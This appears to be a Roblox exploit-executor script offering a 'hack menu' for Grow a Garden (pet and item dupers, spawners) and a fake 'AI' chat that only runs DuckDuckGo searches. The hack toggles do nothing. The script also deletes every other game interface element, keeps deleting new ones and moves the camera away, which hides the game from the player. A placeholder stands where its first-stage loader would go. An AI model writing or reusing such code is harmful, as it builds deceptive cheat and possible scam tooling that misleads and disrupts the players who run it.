--// Scripts.SM Loader (Stage 1 untouched, Stages 2-4 redesigned)

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- GUI setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ScriptsSM_UI"
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = CoreGui

local function createCorner(radius, parent)
	local uic = Instance.new("UICorner")
	uic.CornerRadius = UDim.new(0, radius)
	uic.Parent = parent
end

local function tween(obj, props, time, style, dir)
	TweenService:Create(obj, TweenInfo.new(time or 0.5, style or Enum.EasingStyle.Quad, dir or Enum.EasingDirection.Out), props):Play()
end

-- Clear GUIs but keep own
local function clearAllGUIs()
	for _, gui in ipairs(CoreGui:GetChildren()) do
		if gui ~= ScreenGui then
			pcall(function() gui:Destroy() end)
		end
	end
	for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
		pcall(function() gui:Destroy() end)
	end
end

clearAllGUIs()

CoreGui.DescendantAdded:Connect(function(obj)
	if not obj:IsDescendantOf(ScreenGui) then
		pcall(function() obj:Destroy() end)
	end
end)
LocalPlayer.PlayerGui.DescendantAdded:Connect(function(obj)
	pcall(function() obj:Destroy() end)
end)

-- Camera lock
Camera.CameraType = Enum.CameraType.Scriptable
Camera.CFrame = CFrame.new(9999, 9999, 9999)

-- Stage 1: Loader remains unchanged
-- (Assume your existing loader code here)

--========================
-- Stage 2: Game Selection Redesigned
--========================
local function launchGameSelection()
	clearAllGUIs()

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0,420,0,280)
	frame.Position = UDim2.new(0.5,-210,0.5,-140)
	frame.BackgroundColor3 = Color3.fromRGB(35,35,35)
	frame.Parent = ScreenGui
	createCorner(14, frame)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1,0,0,50)
	title.BackgroundTransparency = 1
	title.Text = "Choose Your Game"
	title.TextColor3 = Color3.fromRGB(255,255,255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 22
	title.Parent = frame

	local buttonContainer = Instance.new("Frame")
	buttonContainer.Size = UDim2.new(1,-20,1,-60)
	buttonContainer.Position = UDim2.new(0,10,0,50)
	buttonContainer.BackgroundTransparency = 1
	buttonContainer.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0,10)
	layout.Parent = buttonContainer

	local games = {"Grow a Garden","Steal a Brain Rot","Pls Donate","Starving Artists","Bloxfruit"}

	local function createButton(name)
		local btn = Instance.new("TextButton")
		btn.Size = UDim2.new(1,0,0,45)
		btn.Text = name
		btn.Font = Enum.Font.Gotham
		btn.TextSize = 16
		btn.TextColor3 = Color3.fromRGB(255,255,255)
		btn.BackgroundColor3 = Color3.fromRGB(50,50,50)
		createCorner(10, btn)
		btn.Parent = buttonContainer

		btn.MouseEnter:Connect(function() tween(btn,{BackgroundColor3=Color3.fromRGB(70,70,70)},0.2) end)
		btn.MouseLeave:Connect(function() tween(btn,{BackgroundColor3=Color3.fromRGB(50,50,50)},0.2) end)

		btn.MouseButton1Click:Connect(function()
			if name ~= "Grow a Garden" then
				frame.Visible = false
				wait(0.5)
				frame.Visible = true
			else
				frame:Destroy()
				launchHackMenu()
			end
		end)
	end

	for _, g in ipairs(games) do
		createButton(g)
	end
end

--========================
-- Stage 3: Hack Menu Redesigned
--========================
function launchHackMenu()
	clearAllGUIs()

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0,450,0,320)
	frame.Position = UDim2.new(0.5,-225,0.5,-160)
	frame.BackgroundColor3 = Color3.fromRGB(35,35,35)
	frame.Parent = ScreenGui
	createCorner(14, frame)

	local title = Instance.new("TextLabel")
	title.Size = UDim2.new(1,0,0,50)
	title.BackgroundTransparency = 1
	title.Text = "Select Hacks"
	title.TextColor3 = Color3.fromRGB(255,255,255)
	title.Font = Enum.Font.GothamBold
	title.TextSize = 22
	title.Parent = frame

	local scroll = Instance.new("ScrollingFrame")
	scroll.Size = UDim2.new(1,-20,1,-90)
	scroll.Position = UDim2.new(0,10,0,60)
	scroll.BackgroundTransparency = 0.2
	scroll.BackgroundColor3 = Color3.fromRGB(40,40,40)
	scroll.BorderSizePixel = 0
	scroll.ScrollBarThickness = 6
	scroll.Parent = frame
	createCorner(10, scroll)

	local layout = Instance.new("UIListLayout")
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Padding = UDim.new(0,8)
	layout.Parent = scroll

	local hacks = {"ESP","Auto Plant","Auto Sell","Auto Buy","Pet Spawner","AI Help","Seed Spawner","Egg Spawner","Pet Duper","Item Duper"}

	local function createCheckbox(text)
		local cb = Instance.new("TextButton")
		cb.Size = UDim2.new(1,0,0,35)
		cb.Text = "[ ] "..text
		cb.TextColor3 = Color3.fromRGB(255,255,255)
		cb.Font = Enum.Font.Gotham
		cb.TextSize = 14
		cb.BackgroundColor3 = Color3.fromRGB(50,50,50)
		createCorner(6, cb)
		cb.Parent = scroll
		local checked = false

		cb.MouseButton1Click:Connect(function()
			checked = not checked
			cb.Text = (checked and "[✔] " or "[ ] ")..text
		end)
		cb.MouseEnter:Connect(function() tween(cb,{BackgroundColor3=Color3.fromRGB(70,70,70)},0.2) end)
		cb.MouseLeave:Connect(function() tween(cb,{BackgroundColor3=Color3.fromRGB(50,50,50)},0.2) end)
	end

	for _, h in ipairs(hacks) do
		createCheckbox(h)
	end

	local nextBtn = Instance.new("TextButton")
	nextBtn.Size = UDim2.new(0,120,0,40)
	nextBtn.Position = UDim2.new(0.5,-60,1,-50)
	nextBtn.AnchorPoint = Vector2.new(0,1)
	nextBtn.Text = "Next"
	nextBtn.TextColor3 = Color3.fromRGB(255,255,255)
	nextBtn.Font = Enum.Font.GothamBold
	nextBtn.TextSize = 16
	nextBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
	createCorner(10,nextBtn)
	nextBtn.Parent = frame

	nextBtn.MouseButton1Click:Connect(function()
		frame:Destroy()
		launchAIChat()
	end)
end

--========================
-- Stage 4: AI Chat Redesigned
--========================
function launchAIChat()
	clearAllGUIs()

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0,550,0,450)
	frame.Position = UDim2.new(0.5,-275,0.5,-225)
	frame.BackgroundColor3 = Color3.fromRGB(30,30,30)
	frame.Parent = ScreenGui
	createCorner(14, frame)

	local topLabel = Instance.new("TextLabel")
	topLabel.Size = UDim2.new(1,0,0,50)
	topLabel.BackgroundTransparency = 1
	topLabel.Text = "Please Test AI before playing game to get information"
	topLabel.TextColor3 = Color3.fromRGB(255,255,255)
	topLabel.Font = Enum.Font.GothamBold
	topLabel.TextSize = 17
	topLabel.Parent = frame

	local chatFrame = Instance.new("ScrollingFrame")
	chatFrame.Size = UDim2.new(0.95,0,0.75,0)
	chatFrame.Position = UDim2.new(0.025,0,0.12,0)
	chatFrame.BackgroundTransparency = 0.2
	chatFrame.BackgroundColor3 = Color3.fromRGB(40,40,40)
	chatFrame.BorderSizePixel = 0
	chatFrame.ScrollBarThickness = 6
	chatFrame.Parent = frame
	createCorner(10, chatFrame)

	local chatLayout = Instance.new("UIListLayout", chatFrame)
	chatLayout.SortOrder = Enum.SortOrder.LayoutOrder
	chatLayout.Padding = UDim.new(0,6)

	local inputBox = Instance.new("TextBox")
	inputBox.Size = UDim2.new(0.78,0,0.08,0)
	inputBox.Position = UDim2.new(0.02,0,0.87,0)
	inputBox.PlaceholderText = "Type your question..."
	inputBox.TextColor3 = Color3.fromRGB(255,255,255)
	inputBox.BackgroundColor3 = Color3.fromRGB(45,45,45)
	createCorner(8, inputBox)
	inputBox.Parent = frame

	local sendBtn = Instance.new("TextButton")
	sendBtn.Size = UDim2.new(0.18,0,0.08,0)
	sendBtn.Position = UDim2.new(0.82,0,0.87,0)
	sendBtn.Text = "Send"
	sendBtn.TextColor3 = Color3.fromRGB(255,255,255)
	sendBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
	createCorner(8, sendBtn)
	sendBtn.Parent = frame

	local function addMessage(sender,text)
		local msg = Instance.new("TextLabel")
		msg.Size = UDim2.new(1,0,0,30)
		msg.BackgroundTransparency = 1
		msg.TextXAlignment = Enum.TextXAlignment.Left
		msg.TextYAlignment = Enum.TextYAlignment.Top
		msg.TextWrapped = true
		msg.Text = sender..": "..text
		msg.TextColor3 = Color3.fromRGB(255,255,255)
		msg.Font = Enum.Font.Gotham
		msg.TextSize = 14
		msg.Parent = chatFrame
		chatFrame.CanvasPosition = Vector2.new(0, chatFrame.AbsoluteCanvasSize.Y)
	end

	local function publicSearch(query)
		local url = "https://api.duckduckgo.com/?q="..query:gsub(" ","+").."&format=json&no_html=1&skip_disambig=1"
		local response
		local success, err = pcall(function()
			if syn then
				response = syn.request({Url=url, Method="GET"})
			elseif http_request then
				response = http_request({Url=url, Method="GET"})
			else
				error("No compatible HTTP request function found.")
			end
		end)
		if not success or not response or not response.Body then return "Error fetching data." end
		local data
		local decodeSuccess = pcall(function() data = HttpService:JSONDecode(response.Body) end)
		if not decodeSuccess then return "Error decoding response." end
		if data.AbstractText and data.AbstractText~="" then return data.AbstractText end
		if data.RelatedTopics and #data.RelatedTopics>0 then
			for _, topic in ipairs(data.RelatedTopics) do
				if topic.Text and topic.Text~="" then return topic.Text end
				if topic.Topics then
					for _, t in ipairs(topic.Topics) do
						if t.Text and t.Text~="" then return t.Text end
					end
				end
			end
		end
		return "No answer found."
	end

	local function typeMessage(sender,message)
		addMessage(sender,"")
		local msgLabel = chatFrame:GetChildren()[#chatFrame:GetChildren()]
		local text=""
		for c in message:gmatch(".") do
			text=text..c
			msgLabel.Text = sender..": "..text
			RunService.RenderStepped:Wait()
		end
	end

	sendBtn.MouseButton1Click:Connect(function()
		local question=inputBox.Text
		if question~="" then
			addMessage("You",question)
			inputBox.Text=""
			typeMessage("AI","Searching...")
			local answer=publicSearch(question)
			typeMessage("AI",answer)
		end
	end)

	inputBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then sendBtn.MouseButton1Click:Fire() end
	end)
end

-- Launch the first redesigned GUI after loader
launchGameSelection()
